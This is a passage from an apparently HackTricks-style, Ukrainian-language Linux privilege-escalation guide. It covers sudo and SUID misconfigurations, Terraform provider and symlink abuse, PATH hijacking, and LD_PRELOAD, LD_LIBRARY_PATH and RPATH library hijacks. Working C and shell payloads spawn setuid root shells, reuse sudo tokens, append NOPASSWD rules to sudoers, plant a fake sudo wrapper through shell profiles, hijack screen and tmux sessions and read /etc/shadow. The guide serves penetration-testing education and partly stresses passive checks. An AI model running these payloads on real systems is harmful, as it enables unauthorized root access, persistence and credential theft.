chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform завершить роботу з помилкою під час Go plugin handshake, але перед цим виконає payload від root і залишить SUID shell.

### Перевизначення TF_VAR + обхід перевірки symlink

Змінні Terraform можна передавати через змінні середовища `TF_VAR_<name>`, якщо конкретне правило sudo зберігає їх. Для **читання** через source-symlink також потрібен provider, який переходить за посиланням і копіює захищений результат у доступне для читання викликачем місце призначення. Для **запису** через destination-symlink окремо потрібен контрольований викликачем запис призначення та привілейований provider, який переходить за ним під час запису; одним із можливих наслідків може бути подальше виконання запланованого завдання. Перш ніж перевіряти будь-який із цих варіантів, дослідіть точний дозвіл sudo, відповідні файли `.tf`, вибрану конфігурацію CLI та власників шляхів за допомогою команд лише для читання, як-от `sudo -l`, `stat` і `readlink`. Слабкі лексичні перевірки на кшталт `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` не розв’язують symlink:<sup>[[25]](#references)</sup>

```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```

Terraform розіменовує symlink і копіює справжній `/root/root.txt` у місце призначення, доступне для читання зловмисником. Такий самий підхід можна використати, щоб **записувати** у привілейовані шляхи, заздалегідь створивши symlink у місці призначення (наприклад, вказавши шлях призначення провайдера на каталог усередині `/etc/cron.d/`).

### requiretty / !requiretty

У деяких старіших дистрибутивах sudo можна налаштувати з параметром `requiretty`, який змушує sudo запускатися лише з інтерактивного TTY. Якщо встановлено `!requiretty` (або цей параметр відсутній), sudo можна запускати з неінтерактивного середовища, наприклад із reverse shell, завдань cron або скриптів.

```bash
Defaults !requiretty
```

Це не є прямою вразливістю саме по собі, але розширює випадки, у яких можна зловживати правилами sudo без повноцінного PTY.

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

Якщо `sudo -l` показує `env_keep+=PATH` або `secure_path` із записами, доступними для запису зловмиснику (наприклад, `/home/<user>/bin`), команду без повного шляху всередині дозволеної sudo цілі можна підмінити.<sup>[[3]](#references)</sup> Відсутність ефективного `secure_path` також варто перевірити, **якщо** середовище sudo для команди зберігає `PATH`, яким може керувати викликач; сама по собі відсутність цього параметра не доводить, що це так. Прочитайте дозволений скрипт, не запускаючи його, а потім перевірте точне правило RunAs та аргументів, ефективний шлях пошуку команд і наявність ранішого в порядку пошуку каталогу, доступного для запису й переходу, який містить потрібну назву команди. Автентифікація, `NOEXEC`, вбудовані команди оболонки й абсолютні шляхи до команд можуть змінити результат.

- Вимоги: правило sudo (часто `NOPASSWD`), яке запускає скрипт/бінарний файл із командами без абсолютних шляхів (`free`, `df`, `ps` тощо), та запис у PATH, доступний для запису й першим у порядку пошуку.

```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```

### Обхід шляхів під час виконання Sudo
**Перейдіть** до читання інших файлів або використовуйте **symlinks**. Наприклад, у файлі sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

Якщо використовується **wildcard** (\*), це ще простіше:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Контрзаходи**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Команда sudo/SUID-бінарний файл без шляху до команди

Якщо **дозвіл sudo** надано для однієї команди **без зазначення шляху**: _hacker10 ALL= (root) less_, це можна використати для експлуатації, змінивши змінну PATH.

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

Цю техніку також можна використати, якщо **suid**-бінарний файл **виконує іншу команду, не вказуючи шлях до неї (завжди перевіряйте вміст дивного SUID-бінарного файла за допомогою** _**strings**_**)**.

[Приклади payload для виконання.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### SUID-бінарний файл зі шляхом до команди

Якщо **suid**-бінарний файл **виконує іншу команду, вказуючи шлях до неї**, можна спробувати **експортувати функцію** з назвою команди, яку викликає файл suid.

Наприклад, якщо бінарний файл suid викликає _**/usr/sbin/service apache2 start**_, потрібно спробувати створити й експортувати функцію:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Після цього, коли ви викличете бінарний файл із SUID, буде виконано цю функцію

### Користувацькі обгортки для копіювання з SUID

Утиліта з SUID, що належить root і приймає шляхи до джерела та призначення, може перетинати дві різні межі довіри. Якщо вона формує shell-команду з будь-якого аргументу (наприклад, передає сформовану команду `cp` у `system()`), метасимволи shell можуть запустити іншу команду з ефективними привілеями утиліти. Навіть якщо вона безпечно викликає `cp`, не використовуючи shell, необмежений шлях призначення може дозволити довільний запис із привілеями в такі файли, як `/etc/passwd`. Перевірте обробку аргументів обгорткою, поведінку effective UID, обмеження для шляху призначення та те, чи зберігає скопійований файл вміст, контрольований користувачем; типова помилка `cp` або сам біт SUID не є доказом жодного з цих сценаріїв. Перед будь-яким ручним тестуванням пасивно перевірте бінарний файл і його дозволи.

### Скрипт, доступний для запису, який виконує обгортка з SUID

Поширена помилка конфігурації користувацьких застосунків — обгортка-бінарний файл із SUID, що належить root і виконує скрипт, доступний для запису користувачам із низькими привілеями.

Типовий шаблон:

```c
int main(void) {
    system("/bin/bash /usr/local/bin/backup.sh");
}
```

Якщо `/usr/local/bin/backup.sh` доступний для запису, можна додати команди payload, а потім виконати SUID-обгортку:

```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```

Швидкі перевірки:

```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```

Цей шлях атаки особливо поширений у «maintenance»/«backup» wrappers, що постачаються в `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Змінна середовища **LD_PRELOAD** використовується для вказання однієї або кількох shared libraries (файлів .so), які завантажувач має завантажити перед усіма іншими, зокрема стандартною бібліотекою C (`libc.so`). Цей процес називається попереднім завантаженням бібліотеки.

Однак для підтримки безпеки системи та запобігання зловживанню цією можливістю, зокрема з виконуваними файлами **suid/sgid**, система застосовує певні умови:

- Завантажувач ігнорує **LD_PRELOAD** для виконуваних файлів, у яких реальний ідентифікатор користувача (_ruid_) не збігається з ефективним ідентифікатором користувача (_euid_).
- Для виконуваних файлів із suid/sgid попередньо завантажуються лише бібліотеки зі стандартних шляхів, які також мають suid/sgid.

Підвищення привілеїв можливе, якщо ви можете виконувати команди за допомогою `sudo`, а у виводі `sudo -l` є рядок **env_keep+=LD_PRELOAD**. Ця конфігурація дає змогу зберігати змінну середовища **LD_PRELOAD** і розпізнавати її навіть під час запуску команд через `sudo`, що потенційно може призвести до виконання довільного коду з підвищеними привілеями.<sup>[[9]](#references)</sup>

```
Defaults        env_keep += LD_PRELOAD
```

Збережіть як **/tmp/pe.c**

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Потім **скомпілюйте його** за допомогою:

```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```

Нарешті, **підвищити привілеї**, запустивши

```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```

> [!CAUTION]
> Подібний privesc можна використати, якщо зловмисник контролює змінну середовища **LD_LIBRARY_PATH**, оскільки він контролює шлях пошуку бібліотек.

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        unsetenv("LD_LIBRARY_PATH");
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```

### SUID Binary – .so injection

Якщо ви натрапили на бінарний файл із незвичними дозволами **SUID**, варто перевірити, чи правильно він завантажує файли **.so**. Це можна перевірити, виконавши таку команду:<sup>[[17]](#references)</sup>

```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```

Наприклад, помилка на кшталт _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ вказує на потенційну можливість експлуатації.

Щоб скористатися цим, потрібно створити файл C, наприклад _"/path/to/.config/libcalc.c"_, і додати до нього такий код:

```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```

Цей код після компіляції та виконання має підвищити привілеї, маніпулюючи дозволами на файли та запускаючи shell із підвищеними привілеями.

Скомпілюйте наведений вище C-файл у shared object (.so) за допомогою:

```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```

Зрештою, запуск ураженого бінарного файлу SUID має активувати експлойт, що може призвести до компрометації системи.

## Shared Object Hijacking

```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Тепер, коли ми знайшли SUID-бінарний файл, який завантажує бібліотеку з каталогу, до якого маємо доступ на запис, створімо в цьому каталозі бібліотеку з потрібною назвою:

```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
        setresuid(0,0,0);
        system("/bin/bash -p");
}
```

Якщо ви отримуєте помилку на кшталт

```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```

це означає, що згенерована вами бібліотека має містити функцію з назвою `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) — це впорядкований список бінарних файлів Unix, які зловмисник може використати, щоб обійти локальні обмеження безпеки. [**GTFOArgs**](https://gtfoargs.github.io/) — те саме, але для випадків, коли ви можете **лише ін’єктувати аргументи** в команду.

Проєкт збирає легітимні функції бінарних файлів Unix, якими можна зловживати, щоб вийти з обмежених оболонок, підвищити або зберегти привілеї, передавати файли, запускати bind- і reverse-shell, а також виконувати інші завдання після експлуатації.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Якщо у вас є доступ до `sudo -l`, скористайтеся інструментом [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo), щоб перевірити, чи знайде він спосіб використати якесь правило sudo.

### Повторне використання токенів Sudo

Якщо у вас є **доступ до sudo**, але немає пароля, ви можете підвищити привілеї, **дочекавшись виконання команди sudo, а потім перехопивши токен сеансу**.<sup>[[18]](#references)</sup>

Вимоги для підвищення привілеїв:

- Ви вже маєте оболонку від імені користувача "_sampleuser_"
- "_sampleuser_" **використовував `sudo`**, щоб щось виконати протягом **останніх 15 хвилин** (за замовчуванням саме стільки діє токен sudo, який дає змогу використовувати `sudo` без введення пароля)
- `cat /proc/sys/kernel/yama/ptrace_scope` повертає 0
- `gdb` доступний (його можна завантажити)

(Ви можете тимчасово ввімкнути `ptrace_scope` командою `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` або ввімкнути його назавжди, змінивши `/etc/sysctl.d/10-ptrace.conf` і встановивши `kernel.yama.ptrace_scope = 0`.)

Якщо всі ці вимоги виконано, **ви можете підвищити привілеї за допомогою:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **Перший експлойт** (`exploit.sh`) створить бінарний файл `activate_sudo_token` у _/tmp_. Використайте його, щоб **активувати токен sudo у вашому сеансі** (ви автоматично не отримаєте root-оболонку, виконайте `sudo su`):

```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```

- **Другий експлойт** (`exploit_v2.sh`) створить оболонку sh у _/tmp_, **яка належить root і має встановлений setuid**

```bash
bash exploit_v2.sh
/tmp/sh -p
```

- **Третій exploit** (`exploit_v3.sh`) **створить файл sudoers**, який зробить **токени sudo безстроковими та дозволить усім користувачам використовувати sudo**

```bash
bash exploit_v3.sh
sudo su
```

### /var/run/sudo/ts/\<Username>

Якщо у вас є **права на запис** у папку або в будь-який із створених у ній файлів, ви можете скористатися бінарним файлом [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools), щоб **створити sudo token для користувача та PID**.\
Наприклад, якщо ви можете перезаписати файл _/var/run/sudo/ts/sampleuser_ і маєте shell від імені цього користувача з PID 1234, ви можете **отримати привілеї sudo**, не знаючи пароля:

```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```

### /etc/sudoers, /etc/sudoers.d

Файл `/etc/sudoers` і файли в каталозі `/etc/sudoers.d` налаштовують, хто може використовувати `sudo` і як саме. За замовчуванням ці файли **можуть читати лише користувач root і група root**.\
**Якщо** ви можете **прочитати** цей файл, то зможете **отримати цікаву інформацію**, а якщо можете **записати** будь-який файл, то зможете **підвищити привілеї**.

```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```

Якщо у вас є право на запис, ви можете зловживати цим дозволом.

```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```

Ще один спосіб зловживати цими правами доступу:

```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```

### DOAS

Існують альтернативи бінарному файлу `sudo`, наприклад `doas` для OpenBSD. Не забудьте перевірити його конфігурацію у `/etc/doas.conf`.

```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```

Якщо `doas` дозволяє використовувати редактор або інтерпретатор, перевірте способи виходу у стилі GTFOBins:

```bash
doas vim
:!/bin/sh
```

Правило `doas` із правами root для оригінального Python-based `dstat` також варто перевірити на предмет шляху пошуку плагінів. У [manual](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) і [source](https://github.com/dstat-real/dstat/blob/master/dstat) серед каталогів для плагінів `dstat_*.py` вказано `/usr/share/dstat/` і `/usr/local/share/dstat/`. Якщо поточний користувач може записувати в каталог, який фактично використовується встановленою збіркою, і шукати в ньому, вибраний плагін може запуститися з ідентичністю RunAs, заданою для `doas`. Перевірте ефективне правило, механізм пошуку плагінів у цій збірці, права доступу або ACL каталогу та батьківських каталогів, а також чи може користувач вибрати плагін; саме правило для `dstat` або каталог із правом запису — лише зачіпка. Інші реалізації `dstat` можуть використовувати інші системи плагінів. Переглядайте метадані пасивно, не завантажуючи плагін.

### Sudo Hijacking

Якщо ви знаєте, що **користувач зазвичай підключається до машини й використовує `sudo`** для підвищення привілеїв, а вам вдалося отримати shell у контексті цього користувача, ви можете **створити новий виконуваний файл sudo**, який виконає ваш код від імені root, а потім — команду користувача. Потім **змініть $PATH** у контексті користувача (наприклад, додавши новий шлях у .bash_profile), щоб під час виконання sudo користувачем запускався ваш виконуваний файл sudo.

Зауважте, що якщо користувач використовує іншу оболонку (не bash), вам потрібно буде змінити інші файли, щоб додати новий шлях. Наприклад, [sudo-piggyback](https://github.com/APTy/sudo-piggyback) змінює `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Інший приклад можна знайти в [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Або виконайте щось на кшталт:

```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```

## Спільна бібліотека

### ld.so

Файл `/etc/ld.so.conf` вказує, **звідки беруться файли конфігурації**. Зазвичай цей файл містить такий шлях: `include /etc/ld.so.conf.d/*.conf`

Це означає, що буде прочитано файли конфігурації з `/etc/ld.so.conf.d/*.conf`. Ці файли конфігурації **вказують на інші теки**, у яких буде виконуватися **пошук** **бібліотек**. Наприклад, вміст `/etc/ld.so.conf.d/libc.conf` — `/usr/local/lib`. **Це означає, що система шукатиме бібліотеки в `/usr/local/lib`**.

Якщо з певної причини **користувач має права на запис** до будь-якого із зазначених шляхів: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, будь-якого файлу всередині `/etc/ld.so.conf.d/` або будь-якої теки, вказаної у файлі конфігурації всередині `/etc/ld.so.conf.d/*.conf`, він може підвищити привілеї.\
Дивіться **як експлуатувати цю помилку конфігурації** на цій сторінці:


{{#ref}}
../../interesting-files-permissions/ld.so.conf-example.md
{{#endref}}

### RPATH

```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x005bb000)
```

Якщо скопіювати бібліотеку в `/var/tmp/flag15/`, програма використовуватиме її звідти, як указано у змінній `RPATH`.

```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Потім створіть шкідливу бібліотеку в `/var/tmp` за допомогою `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`

```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
 char *file = SHELL;
 char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());
 execve(file,argv,0);
}
```

## Linux capabilities

Linux capabilities надають **процесу підмножину доступних привілеїв root**. Це фактично розбиває **привілеї root на менші й окремі одиниці**. Кожну з цих одиниць можна незалежно надавати процесам. Так повний набір привілеїв обмежується, що зменшує ризики експлуатації.\
Перегляньте цю сторінку, щоб **дізнатися більше про capabilities і способи їх зловживання**:


{{#ref}}
../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Дозволи каталогів

У каталозі **біт «execute»** означає, що відповідний користувач може виконати команду «**cd**» для переходу до каталогу.\
Біт **«read»** означає, що користувач може **переглядати список** **файлів**, а біт **«write»** означає, що він може **видаляти** та **створювати** нові **файли**.

## ACLs

Списки контролю доступу (ACLs) є вторинним рівнем дискреційних дозволів, який може **перевизначати традиційні дозволи ugo/rwx**. Ці дозволи розширюють контроль доступу до файлів або каталогів, даючи змогу надавати або забороняти права конкретним користувачам, які не є власниками або учасниками групи. Такий рівень **деталізації забезпечує точніше керування доступом**. Докладніше можна дізнатися [**тут**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>

**Надайте** користувачу «kali» дозволи на читання й запис файлу:

```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```

**Знайдіть** файли з певними ACL у системі:

```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```

### Прихований бекдор ACL у drop-in-файлах sudoers

Поширена помилкова конфігурація — файл у `/etc/sudoers.d/`, що належить root і має режим `440`, але через ACL усе ще надає право на запис користувачу з низькими привілеями.

```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```

Якщо ви бачите щось на кшталт `user:alice:rw-`, користувач може додати правило sudo попри обмежувальні біти прав доступу:

```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

Це шлях до persistence/privesc із високим впливом через ACL, оскільки його легко не помітити під час перевірок лише за допомогою `ls -l`.

## Відкриті shell-сесії

Доступ між користувачами до GNU Screen залежить від **конфігурації та ACL запущеної сесії**, а не лише від версії. [У документації GNU Screen зазначено](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html), що програму потрібно зібрати з підтримкою multiuser; параметр `multiuser on` і дозвіл, наданий через `acladd` або відповідний `aclchg`, дають змогу іншому користувачеві під’єднатися. [У посібнику також вказано, що для пошуку сесії між користувачами потрібен setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html). Сам по собі видимий сокет, що належить root, або бінарний файл `screen` із SUID не підтверджує, що до root shell можна під’єднатися. Перш ніж вважати це підвищенням привілеїв, переконайтеся, що активна сесія працює в режимі multiuser, поточний користувач має ефективні дозволи на введення команд, а shell у цій сесії запущено від імені привілейованого власника.

### Перехоплення screen-сесій

**Перелік screen-сесій**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![перехоплення сеансів screen — розташування сокетів (у деяких системах один із них доступний як символічне посилання на інший): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Під’єднатися до сеансу**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux sessions hijacking

Це була проблема **старих версій tmux**. Мені не вдалося перехопити сеанс tmux (v2.1), створений root, будучи непривілейованим користувачем.

**Перелік сеансів tmux**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Розташування сокетів (у деяких системах один із них доступний як символьне посилання на інший) — tmux sessions hijacking: tmux -S /tmp/dev sess ls Список із використанням цього сокета; ви можете запустити сеанс tmux через цей сокет...](<../../images/image (837).png>)

**Під’єднатися до сеансу**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Перевірте **Valentine box from HTB** як приклад.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Ключі, згенеровані за допомогою вразливих збірок OpenSSL у Debian або похідних дистрибутивах у період історичної вразливості, можуть мати передбачувану випадковість; поточний дистрибутив хоста чи виправлена версія OpenSSL не дають змоги визначити, як було згенеровано старіший ключ. Перевірте **конкретний ключ** за відповідним історичним списком скомпрометованих ключів і з’ясуйте його походження. У посібнику Debian [`ssh-vulnkey`](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) описано перевірку відкритих ключів і `authorized_keys`, а в [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) зафіксовано виправлення OpenSSL. Запис у `authorized_keys` привілейованого облікового запису є лише зачіпкою для ескалації, якщо відповідний закритий ключ можна отримати, а чинна політика SSH досі приймає цей ключ для цього облікового запису; слабкий **ключ хоста** сам по собі не є обліковими даними для входу. Замініть скомпрометовані ключі й видаліть їхні старі авторизації.

### Цікаві параметри конфігурації SSH

- **PasswordAuthentication:** Визначає, чи дозволена автентифікація за паролем. Типове значення в upstream OpenSSH — `yes`; конфігурація дистрибутива може його перевизначити.
- **PubkeyAuthentication:** Визначає, чи дозволена автентифікація за відкритим ключем. Типове значення — `yes`.
- **PermitEmptyPasswords**: Якщо автентифікація за паролем дозволена, визначає, чи дозволяє сервер вхід до облікових записів із порожнім паролем. Типове значення — `no`.

### Файли керування входом

Ці файли впливають на те, хто може входити в систему і як:

- **`/etc/nologin`**: якщо файл існує, він блокує вхід для користувачів, крім root, і виводить своє повідомлення.
- **`/etc/securetty`**: обмежує місця, звідки root може входити в систему (список дозволених TTY).
- **`/etc/motd`**: повідомлення після входу (може розкрити відомості про середовище чи технічне обслуговування).

### PermitRootLogin

Визначає, чи може root входити через ssh. Типове значення в upstream OpenSSH — `prohibit-password`; конфігурація дистрибутива може його перевизначити. Можливі значення:

- `yes`: root може входити за допомогою пароля та закритого ключа
- `without-password` або `prohibit-password`: root може входити лише за допомогою закритого ключа
- `forced-commands-only`: root може входити лише за допомогою закритого ключа та якщо вказано параметри команд
- `no` : ні

### Довірені центри сертифікації SSH для користувачів

`TrustedUserCAKeys` задає відкриті ключі, яким sshd довіряє під час підписання сертифікатів **користувачів**. Якщо відповідний закритий ключ CA доступний для читання користувачу з нижчим рівнем привілеїв, з’ясуйте, хто може отримати сертифікат і для входу під якими principal облікових записів його можна використати. `AuthorizedPrincipalsFile` або `AuthorizedPrincipalsCommand` можуть обмежувати прийнятні імена; якщо не налаштовано жоден із цих параметрів, сертифікат має містити ім’я цільового облікового запису. `PermitRootLogin prohibit-password` блокує вхід root за паролем, але може дозволяти автентифікацію за сертифікатом. Сам факт наявності шляху до ключа не доводить наявність доступу: перевірте пару відкритого/закритого ключів, чинні правила `Match`, політику облікового запису, парольну фразу ключа, відкликання та прийнятні алгоритми підпису. Не додавайте байти закритого ключа до результатів переліку. Див. [посібник з конфігурації сервера OpenSSH](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).

Закритий ключ CA може бути придатним до використання, **навіть якщо поточний користувач не має доступу для читання**, коли правило делегування привілеїв дозволяє цьому користувачу викликати необмежений [засіб підписання сертифікатів, як-от `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s), з правами власника ключа. Зіставте точну дозволену команду та її аргументи з доступом облікового запису-підписувача до ключа, відкритим ключем CA, якому довіряє чинна конфігурація sshd, principal, прийнятним для цільового облікового запису, строком дії сертифіката та політикою входу цього облікового запису. Делегована команда підписувача або файл довіреного CA самі по собі не доводять наявності доступу до іншого облікового запису; не підписуйте тестовий сертифікат під час пасивного переліку.

Про окремий шлях довіри до CA на рівні облікового запису див. [неоднозначність роздільника principal у сертифікатах SSH](../../../network-services-pentesting/pentesting-ssh.md#ssh-certificate-principal-delimiter-confusion).

### AuthorizedKeysFile

Задає файли, що містять відкриті ключі, які можна використовувати для автентифікації користувача. У ньому можуть бути такі токени, як `%h`, які буде замінено на домашній каталог. **Можна вказати абсолютні шляхи** (що починаються з `/`) або **відносні шляхи від домашнього каталогу користувача**. Наприклад:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Ця конфігурація вказує, що якщо спробувати увійти за допомогою **приватного** ключа користувача "**testusername**", ssh порівняє публічний ключ вашого ключа з ключами, розташованими в `/home/testusername/.ssh/authorized_keys` і `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding дає змогу **використовувати локальні SSH-ключі замість того, щоб залишати ключі** (без passphrase!) на сервері. Отже, ви зможете через ssh **підключитися** до **хоста**, а звідти **підключитися до іншого хоста, використовуючи** **ключ**, розташований на **початковому хості**.

Потрібно встановити цю опцію у `$HOME/.ssh.config` ось так:

```
Host example.com
  ForwardAgent yes
```

Зверніть увагу: якщо `Host` — `*`, щоразу, коли користувач переходить на іншу машину, ця машина матиме доступ до ключів (що є проблемою безпеки).

Файл `/etc/ssh_config` може **перевизначити** ці **параметри** та дозволити або заборонити цю конфігурацію.\
Файл `/etc/sshd_config` може **дозволити** або **заборонити** пересилання ssh-agent за допомогою директиви `AllowAgentForwarding` (типове значення — allow).

Якщо ви виявите, що в середовищі налаштовано Forward Agent, ознайомтеся з цією сторінкою, оскільки **ви можете скористатися цим, щоб підвищити привілеї**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Цікаві файли

### Файли профілів

Файл `/etc/profile` і файли в каталозі `/etc/profile.d/` — це **скрипти, які виконуються, коли користувач запускає нову оболонку**. Тому, якщо ви можете **записати або змінити будь-який із них, ви можете підвищити привілеї**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Якщо знайдете якийсь підозрілий скрипт профілю, перевірте його на наявність **конфіденційних даних**.

### Файли Passwd/Shadow

Залежно від ОС файли `/etc/passwd` і `/etc/shadow` можуть мати інші назви або резервні копії. Тому рекомендується **знайти всі такі файли** та **перевірити, чи можна їх прочитати**, щоб з’ясувати, **чи містять вони хеші**:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

